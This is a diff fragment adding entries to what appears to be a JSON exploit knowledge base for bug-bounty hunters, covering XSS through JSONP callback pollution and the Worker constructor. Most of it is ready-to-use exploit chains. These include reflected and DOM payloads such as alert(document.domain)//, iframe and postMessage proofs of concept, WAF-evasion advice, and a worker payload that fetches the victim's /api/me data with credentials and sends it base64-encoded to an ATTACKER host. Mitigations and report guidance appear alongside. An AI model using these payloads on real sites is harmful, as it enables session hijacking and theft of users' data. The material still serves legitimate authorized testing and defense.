+              "command": "curl -s 'https://TARGET/api/jsonp?callback=jlfTrace1337' | head -c 200",
+              "indicator": "the response body starts with 'jlfTrace1337({' — the callback name is reflected verbatim and Content-Type is a JavaScript type"
+            },
+            {
+              "action": "Inject code through the callback parameter",
+              "payload": "?callback=alert(document.domain)//",
+              "command": "curl -s 'https://TARGET/api/jsonp?callback=alert(document.domain)%2F%2F' | head -c 200",
+              "indicator": "the response body is 'alert(document.domain)//({...})' — valid JS where your code precedes the commented-out data"
+            },
+            {
+              "action": "Execute in the origin via a page that includes the endpoint",
+              "payload": "?cb=alert(document.domain)//",
+              "command": "find the page that passes its URL parameter into the JSONP callback (confirm with a marker: open 'https://TARGET/search?cb=jlfTrace1337' and check the outgoing request carries callback=jlfTrace1337), then open 'https://TARGET/search?cb=alert(document.domain)%2F%2F' in a browser",
+              "indicator": "the alert fires when the page's dynamically created JSONP script loads"
+            }
+          ],
+          "eligibility": "Accepted as reflected XSS on all major platforms when execution in the target origin is demonstrated. Directly linking a victim to the raw API URL also executes (script context via sniffing historically; modern Chrome requires a JS MIME type — check and document it)."
+        },
+        {
+          "source": "location.hash",
+          "steps": [
+            {
+              "action": "Confirm the app builds its callback name from the fragment",
+              "payload": "#cb=jlfTrace1337",
+              "command": "open 'https://TARGET/page#cb=jlfTrace1337' and capture the outgoing JSONP request in Network",
+              "indicator": "the request URL contains 'callback=jlfTrace1337' — the fragment drives the callback parameter"
+            },
+            {
+              "action": "Pollute the callback with code",
+              "payload": "#cb=alert(document.domain)//",
+              "command": "open 'https://TARGET/page#cb=alert(document.domain)%2F%2F' in a browser",
+              "indicator": "the alert fires when the JSONP response executes; the fragment delivery kept the payload invisible to any server WAF"
+            }
+          ],
+          "eligibility": "Accepted as DOM XSS via callback pollution; server-WAF-blind delivery is a report highlight."
+        },
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Verify message data sets the callback name",
+              "payload": "jlfTrace1337",
+              "command": "postMessage('jlfTrace1337','*') from the console on https://TARGET/page and capture the JSONP request URL",
+              "indicator": "the callback parameter equals the posted value and the listener lacks strict origin validation"
+            },
+            {
+              "action": "Execute via callback pollution cross-origin",
+              "payload": "alert(document.domain)//",
+              "command": "open a page hosting <iframe src=\"https://TARGET/page\"></iframe><script>onload=()=>frames[0].postMessage('alert(document.domain)//','*')</script>",
+              "indicator": "the alert fires inside the target frame when the polluted JSONP response executes"
+            }
+          ],
+          "eligibility": "Accepted everywhere with missing/bypassable origin checks; include the listener code and the reflected response body in the report."
+        }
+      ],
+      "contexts": {
+        "raw-reflection": "Callback reflected with no filter: 'alert(document.domain)//' works directly.",
+        "identifier-filter": "Filter allows [a-zA-Z0-9_$]: classic payload space is dead — try filter gaps: '.' (allows 'top.alert(document.domain)' patterns if parens survive), Unicode identifier characters, or a filter applied only to the first character.",
+        "wrapped-callback": "Response is 'parent.cbName(data)': payload must fit member-expression syntax — 'alert(document.domain)//' after the last dot still works if dots and parens pass the filter.",
+        "mime-blocked": "Response served as application/json with X-Content-Type-Options: nosniff refuses script execution in modern browsers — then the finding shifts to the consumer-side pollution path only."
+      },
+      "waf_notes": "The payload alphabet (letters, parens, dots, '//') matches no HTML signatures, so most WAF rules stay quiet. Some CDNs special-case 'callback=' — test alternate parameter names the endpoint honors (cb, jsonp, jsoncallback, func). Fragment-driven callback pollution bypasses any server-side inspection entirely.",
+      "eligibility": "Accepted as reflected/DOM XSS. Be precise about WHERE execution happens: code runs in the origin of the page including the script, which is the consumer app, not the API host — misattributing the origin is the most common reason these reports get bounced.",
+      "mitigations": [
+        "Restrict callback names to a strict identifier regex (^[a-zA-Z_$][a-zA-Z0-9_$]{0,60}$) and reject everything else.",
+        "Serve JSONP with X-Content-Type-Options: nosniff and, better, migrate consumers to CORS + JSON.",
+        "On the consumer side, never build callback names from URL/message/storage data; generate them internally."
+      ],
+      "related": [
+        "script.src",
+        "createElement('script') + append",
+        "eval",
+        "innerHTML"
+      ],
+      "references": [
+        "PortSwigger: DOM-based XSS",
+        "HackTricks: XSS - Cross Site Scripting",
+        "OWASP WSTG: Testing for DOM-based Cross Site Scripting (WSTG-CLNT-01)"
+      ]
+    },
+    {
+      "id": "sink-worker-constructor",
+      "name": "Worker constructor",
+      "category": "script-injection",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "new Worker",
+        "Worker(",
+        "new SharedWorker",
+        "SharedWorker("
+      ],
+      "severity": "P2",
+      "severity_note": "P2: tainted worker URL = attacker code in a worker of the page's origin (credentialed fetch, IndexedDB). P3 if the taint only reaches a same-origin path with no reflection gadget.",
+      "explain": "new Worker(url) spawns a background thread executing the script at url. Same-origin policy applies to the worker script itself (must be same-origin, or a CORS-enabled cross-origin script in modern browsers), but if any part of the URL is attacker-controlled — full URL, path, or query — the attacker steers what code runs in a privileged background context.",
+      "how_it_works": "Worker scripts must be same-origin by default, which constrains the naive 'point it at my server' attack — BUT: (1) query/path control on a same-origin URL can hit reflection endpoints that return JS (echo APIs, JSONP, error pages that reflect the path with a JS MIME type); (2) Blob-URL workers created from attacker strings are the related code-injection variant; (3) some apps pass the URL through a redirector or a CDN wrapper where path traversal reaches attacker-influenceable content. Once running, the worker performs credentialed same-origin fetch() and reads IndexedDB.",
+      "why_it_matters": "A poisoned worker URL is a stealthy session-compromise primitive: no DOM artifacts, no visible page change, and full API access with the victim's cookies. SharedWorker variants persist across tabs. Reviewers who only model page-context XSS routinely miss this class.",
+      "exploitable_when": [
+        "location.search",
+        "location.hash",
+        "postMessage-data",
+        "localStorage"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm query taint reaches the Worker constructor",
+              "payload": "?w=/jlf-trace.js",
+              "command": "open 'https://TARGET/page?w=/jlf-trace.js' and watch Network for the worker script request",
+              "indicator": "the browser requests the supplied path as a worker script (initiator: Worker constructor)"
+            },
+            {
+              "action": "Reach executable same-origin content",
+              "payload": "?w=/api/echo?body=fetch('/api/me',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('https://ATTACKER/c?d='+btoa(t)))",
+              "command": "identify a same-origin endpoint reflecting input as JS (echo/JSONP) and supply it as the worker URL",
+              "indicator": "the worker starts and your listener receives the victim's /api/me data"
+            },
+            {
+              "action": "Test cross-origin worker loading if full URL control exists",
+              "payload": "?w=https://ATTACKER/w.js",
+              "command": "host w.js with 'Access-Control-Allow-Origin: *' and 'Content-Type: text/javascript' and open the URL — cross-origin worker scripts require CORS in modern browsers",
+              "indicator": "the worker spawns and executes; if CORS blocks it, capture the console error and fall back to the same-origin gadget path"
+            }
+          ],
+          "eligibility": "Accepted as session/API compromise when a working worker-execution PoC exists. Be explicit about the same-origin constraint and which gadget satisfied it; a full-URL PoC that CORS-blocks is not a valid finding."
+        },
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Verify message data becomes the worker URL",
+              "payload": "/jlf-trace.js",
+              "command": "postMessage('/jlf-trace.js','*') from the console on https://TARGET/page and watch Network for the worker request",
+              "indicator": "the supplied path is requested as a worker script and the listener lacks strict origin validation"
+            },
+            {
+              "action": "Spawn an attacker-steered worker cross-origin",
+              "payload": "/api/echo?body=fetch('/api/me',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('https://ATTACKER/c?d='+btoa(t)))",
+              "command": "open a page hosting <iframe src=\"https://TARGET/page\"></iframe><script>onload=()=>frames[0].postMessage(\"/api/echo?body=fetch('/api/me',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('https://ATTACKER/c?d='+btoa(t)))\",'*')</script>",
+              "indicator": "the victim's API data arrives at your listener, proving cross-origin worker steering"
+            }
+          ],
+          "eligibility": "Accepted everywhere with missing/bypassable origin checks and a demonstrated worker execution."
+        },
+        {
+          "source": "localStorage",
+          "steps": [
+            {
+              "action": "Plant and trace a stored worker URL",
+              "payload": "/jlf-trace.js",
+              "command": "localStorage.setItem('workerUrl','/jlf-trace.js'); reload https://TARGET/page and watch the worker request",
+              "indicator": "the stored URL is requested as the worker script on load"
+            },
+            {
+              "action": "Escalate via a remote write path",
+              "payload": "/api/echo?body=fetch('/api/me',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('https://ATTACKER/c?d='+btoa(t)))",
+              "command": "find the server-synced feature for this key and set the gadget URL from a second account",
+              "indicator": "the first account spawns the steered worker after sync — persistent, DOM-invisible session compromise"
+            }
+          ],
+          "eligibility": "Self-planted is self-XSS (not eligible); the synced variant is a strong stored finding."
+        }
+      ],
+      "contexts": {
+        "same-origin-constraint": "Worker scripts are same-origin by default; exploitation usually needs a same-origin JS-reflection gadget or CORS-enabled host. State the constraint in the report.",
+        "blob-variant": "If the app builds the worker from new Blob([tainted]) + URL.createObjectURL, that is direct code injection (see dynamic worker code) — no same-origin constraint applies.",
+        "shared-worker": "new SharedWorker(url, name) with tainted url or name: the name partitions the shared instance — a tainted name can point the victim's tab at an attacker-previously-poisoned shared worker in some flows."
+      },
+      "waf_notes": "Worker URLs are URL-shaped and WAF-quiet. CSP worker-src governs the constructor (fallback: script-src, then default-src) — check all three when assessing exploitability. Module workers (type:'module') additionally require CORS for cross-origin and strict MIME types.",
+      "eligibility": "Legitimate finding graded on worker-reachable impact (credentialed fetch, IndexedDB). Not page XSS — frame the report as background code execution with session-equivalent access. Console-spawned workers are self-XSS and not eligible.",
+      "mitigations": [
+        "Hardcode worker URLs; never derive them from URL, message, or storage data.",
+        "Set CSP worker-src to exact same-origin paths.",
+        "Validate any unavoidable dynamic worker path against a strict allowlist before constructing."
+      ],
+      "related": [
+        "dynamic Worker code",
+        "script.src",
+        "createElement('script') + append",
+        "import() (dynamic)"
+      ],
+      "references": [
+        "MDN: Worker()",
+        "HackTricks: XSS - Cross Site Scripting"
+      ]
+    }
+  ]
+}
